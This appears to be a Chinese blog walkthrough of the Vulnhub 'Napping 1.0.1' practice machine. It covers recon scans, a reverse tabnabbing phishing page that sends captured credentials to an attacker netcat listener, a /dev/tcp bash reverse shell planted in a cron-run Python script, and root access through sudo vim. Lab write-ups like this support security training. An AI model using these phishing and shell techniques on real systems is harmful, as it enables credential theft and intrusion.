{"pageProps":{"postData":{"id":"VulnhubNapping 1 0 1","contentHtml":"<h1>Napping: 1.0.1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/napping-101,752/\">https://www.vulnhub.com/entry/napping-101,752/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>3</code>是靶机，<code>kali</code>的<code>ip</code>为<code>192.168.56.10</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-10 14:32 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00052</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:F3:<span class=\"hljs-number\">77</span>:<span class=\"hljs-number\">5</span>D (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.3</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00048</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">49</span>:EE:<span class=\"hljs-number\">4</span>D (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.3</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-10 14:32 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.3</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00068</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">49</span>:EE:<span class=\"hljs-number\">4</span>D (Oracle VirtualBox virtual NIC)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.3</span>    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-10 14:33 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.3</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00049</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">3</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">49</span>:EE:<span class=\"hljs-number\">4</span>D (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nikto -host <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span> -port <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>\n- Nikto v2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.0</span>\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>\n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">43</span> (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> (Ubuntu)\n+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ /: The anti-clickjacking X-Frame-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/\n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)\n+ Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.54</span>). Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.34</span> <span class=\"hljs-keyword\">is</span> the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2.</span>x branch.\n+ /: Web Server returns a valid response <span class=\"hljs-keyword\">with</span> junk HTTP methods which may cause false positives.\n+ /config.php: PHP Config file may contain database IDs <span class=\"hljs-keyword\">and</span> passwords.\n+ <span class=\"hljs-number\">8106</span> requests: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">6</span> item(s) reported on remote host\n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">34</span>:08 (GMT8) (<span class=\"hljs-number\">25</span> seconds)\n---------------------------------------------------------------------------\n+ <span class=\"hljs-number\">1</span> host(s) tested\n</code></pre>\n<p>优先级依旧<code>80</code>><code>22</code> ,不过没扫描出什么漏洞</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，<code>CSS</code>使用的是<code>bootstrap</code> 的链接，没有魔法可能会加载不了样式</p>\n<p><img src=\"/post-images/VulnhubNapping%201%200%201/image80.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">15</span>:05:<span class=\"hljs-number\">00</span>] Starting: \n[<span class=\"hljs-number\">15</span>:05:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -    0B  - /config.php\n[<span class=\"hljs-number\">15</span>:05:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">200</span> -  539B  - /index.php/login/\n[<span class=\"hljs-number\">15</span>:05:<span class=\"hljs-number\">34</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  index.php\n[<span class=\"hljs-number\">15</span>:05:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -  563B  - /register.php\n</code></pre>\n<ul>\n<li><code>/index.php/login/</code> 登录页</li>\n<li><code>/register.php</code> 注册页</li>\n</ul>\n</li>\n<li>\n<p>注册用户<code>test</code>密码<code>123456</code> ，登录后台跳转到<code>welcome.php</code></p>\n<ul>\n<li>\n<p><code>welcome.php</code></p>\n<p><img src=\"/post-images/VulnhubNapping%201%200%201/image81.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">\nHello, test! Welcome to our free blog promotions site.\nPlease submit your link so that we can get started. All links will be reviewed by our admin\n<span class=\"hljs-comment\">##</span>\n你好，test！欢迎来到我们的免费博客推广网站。\n请提交您的链接，以便我们开始。所有链接都将由我们的管理员审核\n</code></pre>\n<p>说是输入链接后管理员会获取检查我们链接</p>\n</li>\n<li>\n<p>输入链接，链接提交后会有个<code>here</code> 标签，发现是<code>Reverse Tabnabbing</code></p>\n<blockquote>\n<p>什么是<code>Reverse Tabnabbing</code> ：<a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">https://owasp.org/www-community/attacks/Reverse_Tabnabbing</a></p>\n</blockquote>\n<p><img src=\"/post-images/VulnhubNapping%201%200%201/image82.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>制作钓鱼页面</p>\n<ul>\n<li>\n<p>恶意页面<code>a.html</code>（跳转用）</p>\n<pre><code class=\"hljs language-python\">&#x3C;!DOCTYPE html>\n&#x3C;html>\n &#x3C;body>\n  &#x3C;script>\n   <span class=\"hljs-keyword\">if</span>(window.opener) mainframe.location.replace=(<span class=\"hljs-string\">'http://192.168.56.10:1234/login.htm'</span>);\n      <span class=\"hljs-keyword\">if</span>(window.opener  != window) mainframe.location.replace=(<span class=\"hljs-string\">'http://192.168.56.10:1234/login.htm'</span>);\n  &#x3C;/script>\n &#x3C;/body>\n&#x3C;/html>\n</code></pre>\n</li>\n<li>\n<p>钓鱼页面，使用靶机的<code>login.htm</code>页面</p>\n<pre><code class=\"hljs language-python\">&#x3C;!DOCTYPE html>\n&#x3C;html lang=<span class=\"hljs-string\">\"en\"</span>>\n&#x3C;head>\n    &#x3C;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>>\n    &#x3C;title>Login&#x3C;/title>\n    &#x3C;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\"</span>>\n    &#x3C;style>\n        body{ font: 14px sans-serif; }\n        .wrapper{ width: 360px; padding: 20px; }\n    &#x3C;/style>\n&#x3C;/head>\n&#x3C;body>\n    &#x3C;div <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"wrapper\"</span>>\n        &#x3C;h2>Login&#x3C;/h2>\n        &#x3C;p>Please fill <span class=\"hljs-keyword\">in</span> your credentials to login.&#x3C;/p>\n\n        &#x3C;div <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"alert alert-danger\"</span>>Invalid username <span class=\"hljs-keyword\">or</span> password.&#x3C;/div>\n        &#x3C;form action=<span class=\"hljs-string\">\"http://192.168.56.10:1234\"</span> method=<span class=\"hljs-string\">\"post\"</span>>\n            &#x3C;div <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"form-group\"</span>>\n                &#x3C;label>Username&#x3C;/label>\n                &#x3C;<span class=\"hljs-built_in\">input</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"username\"</span> <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"form-control \"</span> value=<span class=\"hljs-string\">\"test\"</span>>\n                &#x3C;span <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"invalid-feedback\"</span>>&#x3C;/span>\n            &#x3C;/div>    \n            &#x3C;div <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"form-group\"</span>>\n                &#x3C;label>Password&#x3C;/label>\n                &#x3C;<span class=\"hljs-built_in\">input</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"password\"</span> name=<span class=\"hljs-string\">\"password\"</span> <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"form-control \"</span>>\n                &#x3C;span <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"invalid-feedback\"</span>>&#x3C;/span>\n            &#x3C;/div>\n            &#x3C;div <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"form-group\"</span>>\n                &#x3C;<span class=\"hljs-built_in\">input</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"submit\"</span> <span class=\"hljs-keyword\">class</span>=<span class=\"hljs-string\">\"btn btn-primary\"</span> value=<span class=\"hljs-string\">\"Login\"</span>>\n            &#x3C;/div>\n            &#x3C;p>Don<span class=\"hljs-string\">'t have an account? &#x3C;a href=\"register.php\">Sign up now&#x3C;/a>.&#x3C;/p>\n        &#x3C;/form>\n    &#x3C;/div>\n&#x3C;/body>\n&#x3C;/html>\n</span></code></pre>\n</li>\n<li>\n<p>都放在<code>kali</code>的一个文件夹下</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/diaoyu]\n└─<span class=\"hljs-comment\"># ls</span>\na.html  Login_files  Login.htm\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>使用<code>python</code>开启简易<code>web</code>服务器（<code>~/Desktop/test/diaoyu</code>文件夹下）</p>\n<pre><code class=\"hljs language-python\">python -m http.server <span class=\"hljs-number\">80</span>\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>\n</code></pre>\n</li>\n<li>\n<p>然后在页面上提交<code>http://192.168.56.10/a.html</code> ，随后等待管理员检查链接</p>\n<p>简易服务器发现有人请求<code>a.html</code>了</p>\n<pre><code class=\"hljs language-python\">python -m http.server <span class=\"hljs-number\">80</span>\nServing HTTP on <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> port <span class=\"hljs-number\">80</span> (http://<span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>/) ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span> - - [<span class=\"hljs-number\">10</span>/Nov/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">22</span>:05] <span class=\"hljs-string\">\"GET /a.html HTTP/1.1\"</span> <span class=\"hljs-number\">200</span> -\n</code></pre>\n<p>查看nc,得到用户凭证</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>] <span class=\"hljs-number\">43212</span>\nPOST /login.htm HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">1234</span>\nUser-Agent: python-requests/<span class=\"hljs-number\">2.22</span><span class=\"hljs-number\">.0</span>\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Length: <span class=\"hljs-number\">45</span>\nContent-<span class=\"hljs-type\">Type</span>: application/x-www-form-urlencoded\n\nusername=daniel&#x26;password=C%40ughtm3napping123 \n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>获得shell</h2>\n<ol>\n<li>\n<p>得到用户凭证后，尝试登录<code>ssh</code></p>\n<pre><code class=\"hljs language-python\">daniel\nC@ughtm3napping123\n</code></pre>\n<p>登陆成功</p>\n</li>\n<li>\n<p>查看权限</p>\n</li>\n</ol>\n<pre><code class=\"hljs language-python\">daniel@napping:~$ whoami                                                                │┌──(root㉿kali)-[~/Desktop/test/diaoyu]\ndaniel                                                                                  │└─<span class=\"hljs-comment\"># python -m http.server 80</span>\ndaniel@napping:~$ <span class=\"hljs-built_in\">id</span>                                                                    │Serving HTTP on <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> port <span class=\"hljs-number\">80</span> (http://<span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>/) ...\nuid=<span class=\"hljs-number\">1001</span>(daniel) gid=<span class=\"hljs-number\">1001</span>(daniel) groups=<span class=\"hljs-number\">1001</span>(daniel),<span class=\"hljs-number\">1002</span>(administrators)              │^C\ndaniel@napping:~$ uname -a                                                              │Keyboard interrupt received, exiting.\nLinux napping <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">89</span>-generic <span class=\"hljs-comment\">#100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_6│                                                                                                         </span>\n<span class=\"hljs-number\">4</span> x86_64 GNU/Linux \n</code></pre>\n<ol>\n<li>\n<p>查找敏感文件</p>\n<ul>\n<li>\n<p><code>suid</code>以及<code>sudo</code>没有可利用的</p>\n</li>\n<li>\n<p>寻找数据库配置文件</p>\n<pre><code class=\"hljs language-python\">daniel@napping:/var/www/html$ cat config.php \n&#x3C;?php\n/* Database credentials. Assuming you are running MySQL\nserver <span class=\"hljs-keyword\">with</span> default setting (user <span class=\"hljs-string\">'root'</span> <span class=\"hljs-keyword\">with</span> no password) */\ndefine(<span class=\"hljs-string\">'DB_SERVER'</span>, <span class=\"hljs-string\">'localhost'</span>);\ndefine(<span class=\"hljs-string\">'DB_USERNAME'</span>, <span class=\"hljs-string\">'adrian'</span>);\ndefine(<span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'P@sswr0d456'</span>);\ndefine(<span class=\"hljs-string\">'DB_NAME'</span>, <span class=\"hljs-string\">'website'</span>);\n \n/* Attempt to connect to MySQL database */\n$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n \n// Check connection\n<span class=\"hljs-keyword\">if</span>($mysqli === false){\n    die(<span class=\"hljs-string\">\"ERROR: Could not connect. \"</span> . $mysqli->connect_error);\n}\n?>\n</code></pre>\n<p>发现<code>adrian</code> 的账号密码</p>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试登录<code>adrian</code> 账户，无法登录</p>\n</li>\n<li>\n<p>登录数据库查找敏感信息，没有可以用的信息</p>\n</li>\n<li>\n<p>继续寻找敏感文件</p>\n<ul>\n<li>\n<p>知道存在<code>adrian</code> 用户，在<code>adrian</code> 的家目录存在<code>site_status.txt</code> ，我们拥有读权限</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># site_status.txt</span>\n....\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> 09:<span class=\"hljs-number\">58</span>:01\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">00</span>:02\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:02:01\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:04:01\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:06:01\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:08:01\nSite <span class=\"hljs-keyword\">is</span> Up: <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">2024</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:02\n</code></pre>\n<p>一长串的类似的文本，应该是服务器启动时记录的，每两分钟一次，应该是有<code>cron</code>任务</p>\n</li>\n<li>\n<p>同目录下还存在<code>query.py</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">from</span> datetime <span class=\"hljs-keyword\">import</span> datetime\n<span class=\"hljs-keyword\">import</span> requests\n\nnow = datetime.now()\n\nr = requests.get(<span class=\"hljs-string\">'http://127.0.0.1/'</span>)\n<span class=\"hljs-keyword\">if</span> r.status_code == <span class=\"hljs-number\">200</span>:\n    f = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"site_status.txt\"</span>,<span class=\"hljs-string\">\"a\"</span>)\n    dt_string = now.strftime(<span class=\"hljs-string\">\"%d/%m/%Y %H:%M:%S\"</span>)\n    f.write(<span class=\"hljs-string\">\"Site is Up: \"</span>)\n    f.write(dt_string)\n    f.write(<span class=\"hljs-string\">\"\\n\"</span>)\n    f.close()\n<span class=\"hljs-keyword\">else</span>:\n    f = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"site_status.txt\"</span>,<span class=\"hljs-string\">\"a\"</span>)\n    dt_string = now.strftime(<span class=\"hljs-string\">\"%d/%m/%Y %H:%M:%S\"</span>)\n    f.write(<span class=\"hljs-string\">\"Check Out Site: \"</span>)\n    f.write(dt_string)\n    f.write(<span class=\"hljs-string\">\"\\n\"</span>)\n    f.close()\n</code></pre>\n<p>得知<code>site_status.txt</code> 的内容时由该文件产生</p>\n<p>查看权限，刚好我们也是<code>administrators</code>的用户</p>\n<pre><code class=\"hljs language-python\">daniel@napping:/home/adrian$ ls -al query.py \n-rw-rw-r-- <span class=\"hljs-number\">1</span> adrian administrators <span class=\"hljs-number\">481</span> Oct <span class=\"hljs-number\">30</span>  <span class=\"hljs-number\">2021</span> query.py\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>我们拥有修改<code>query.py</code> 的权限，那就是拥有adrian用户的权限了</p>\n<ul>\n<li>\n<p>修改<code>query.py</code> ,在顶部添加</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> os;\nos.system(<span class=\"hljs-string\">\"bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.10/1234 0>&#x26;1'\"</span>);\n</code></pre>\n<p>同时开启监听</p>\n</li>\n<li>\n<p>等待执行</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>                        \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.3</span>] <span class=\"hljs-number\">43506</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">3289</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nadrian@napping:~$\n</code></pre>\n<p>获得用户<code>adrian</code>的<code>shell</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>查找敏感文件</p>\n<ul>\n<li>\n<p>第一个flag文件</p>\n<pre><code class=\"hljs language-python\">adrian@napping:~$ cat user.txt\nYou are nearly there!\n</code></pre>\n</li>\n<li>\n<p><code>sudo -l</code> ，K.O.</p>\n<pre><code class=\"hljs language-python\">adrian@napping:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> adrian on napping:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser adrian may run the following commands on napping:\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/vim\nadrian@napping:~$ \n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><code>vim</code>可以免密码以<code>root</code>账号执行，故可以提权</p>\n<pre><code class=\"hljs language-python\">adrian@napping:~$ sudo vim\n</code></pre>\n<p>然后在命令行模式下输入<code>!/bin/bash</code></p>\n<pre><code class=\"hljs language-python\">:!/<span class=\"hljs-built_in\">bin</span>/bash\n\n<span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n<p>获得root！！！！</p>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">cat root.txt\nAdmins just can<span class=\"hljs-string\">'t stay awake tsk tsk tsk\n</span></code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>学习到<code>Reverse_Tabnabbing</code>的钓鱼攻击方式</p>","title":"Vulnhub - Napping 1 0 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Napping: 1.0.1\n\n https://www.vulnhub.com/entry/napping-101,752/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`3`是靶机，`kali`的`ip`为`192.168.56.10`\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. ..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"}]},"__N_SSG":true}